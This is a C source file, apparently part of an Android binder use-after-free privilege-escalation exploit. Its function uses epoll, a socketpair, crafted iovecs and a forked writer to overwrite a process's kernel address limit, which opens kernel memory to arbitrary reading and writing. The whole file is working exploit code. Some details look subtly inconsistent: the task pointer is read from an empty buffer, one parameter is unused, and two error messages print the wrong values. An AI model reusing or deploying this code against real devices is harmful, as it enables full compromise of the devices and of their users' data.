#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#include "../include/binder_uaf.h"
#include "../include/event_poll.h"
#include "../include/log.h"

void corrupt_address_limit(int binder_fd, struct task_struct **leak_task_struct,
                           void **mapped_memory) {
  int sock_fd[2] = {0};
  ssize_t nBytesWritten = 0;
  struct iovec iovecStack[IOVEC_COUNT];
  struct msghdr message = {NULL};
  struct epoll_event epoll_event_t = {.events = EPOLLIN};

  int epfd = event_pool_create();

  if (epfd < 0) {
    exit(EXIT_FAILURE);
  }

  INFO("Setting up socket");

  if (socketpair(AF_UNIX, SOCK_STREAM, 0, sock_fd)) {
    ERROR("Unable to create socketpair");
    exit(EXIT_FAILURE);
  } else {
    INFO("Socket pair created successfully");
  }

  static char junkSocketData[] = {0x41};

  INFO("Writing junk data to socket");

  nBytesWritten = write(sock_fd[1], &junkSocketData, sizeof(junkSocketData));

  if (nBytesWritten != sizeof(junkSocketData)) {
    ERROR("Write failed. nBytesWritten: 0x%lx, expected 0x%lx", nBytesWritten,
          sizeof(nBytesWritten));
    exit(EXIT_FAILURE);
  }

  INFO("Setting up iovecs");

  *mapped_memory =
      mmap((void *)0x100000000ul, 2 * PAGE_SIZE, PROT_READ | PROT_WRITE,
           MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

  if (*mapped_memory == MAP_FAILED) {
    ERROR("Failed to map 4gb aligned page");
    exit(EXIT_FAILURE);
  }
  SUCCESS("Mapped page: %p", *mapped_memory);

  memset(iovecStack, 0, sizeof(iovecStack));

  iovecStack[IOVEC_WQ_INDEX].iov_base = *mapped_memory;
  iovecStack[IOVEC_WQ_INDEX].iov_len = 1;

  iovecStack[IOVEC_WQ_INDEX + 1].iov_base =
      (void *)((char *)(*mapped_memory) + PAGE_SIZE);
  iovecStack[IOVEC_WQ_INDEX + 1].iov_len = 0x8 + 0x8 + 0x8 + 0x8;

  iovecStack[IOVEC_WQ_INDEX + 2].iov_base =
      (void *)((char *)(*mapped_memory) + PAGE_SIZE + PAGE_SIZE);
  iovecStack[IOVEC_WQ_INDEX + 2].iov_len = 0x8;

  static char dataBuffer[PAGE_SIZE] = {0};

  struct task_struct *m_task_struct =
      *(struct task_struct **)(dataBuffer + TASK_STRUCT_OFFSET_IN_LEAKED_DATA);

  uint64_t finalSocketData[] = {
      0x1,
      0x41414141,
      0x8 + 0x8 + 0x8 + 0x8,
      (uint64_t)((uint8_t *)m_task_struct + OFFSET_TASK_STRUCT_ADDR_LIMIT),
      0xFFFFFFFFFFFFFFFE,
  };

  message.msg_iov = iovecStack;
  message.msg_iovlen = IOVEC_COUNT;

  event_pool_add(epfd, binder_fd, &epoll_event_t);

  pid_t childPid = fork();

  if (childPid == 0) {
    sleep(2);
    event_pool_remove(epfd, binder_fd, &epoll_event_t);
    nBytesWritten = write(sock_fd[1], finalSocketData, sizeof(finalSocketData));

    if (nBytesWritten != sizeof(finalSocketData)) {
      ERROR("Write failed. nBytesWritten: 0x%lx, expected: 0x%lx",
            nBytesWritten, sizeof(finalSocketData));
    }

    exit(EXIT_SUCCESS);
  }

  binder_thread_exit(binder_fd);

  ssize_t nBytesReceived = recvmsg(sock_fd[0], &message, MSG_WAITALL);

  ssize_t expectedBytesReceived = iovecStack[IOVEC_WQ_INDEX].iov_len +
                                  iovecStack[IOVEC_WQ_INDEX + 1].iov_len +
                                  iovecStack[IOVEC_WQ_INDEX + 2].iov_len;

  if (nBytesReceived != expectedBytesReceived) {
    ERROR("recvmsg failed. nBytesReceived: 0x%lx, expected: 0x%lx",
          nBytesWritten, expectedBytesReceived);
    exit(EXIT_FAILURE);
  }

  wait(NULL);
}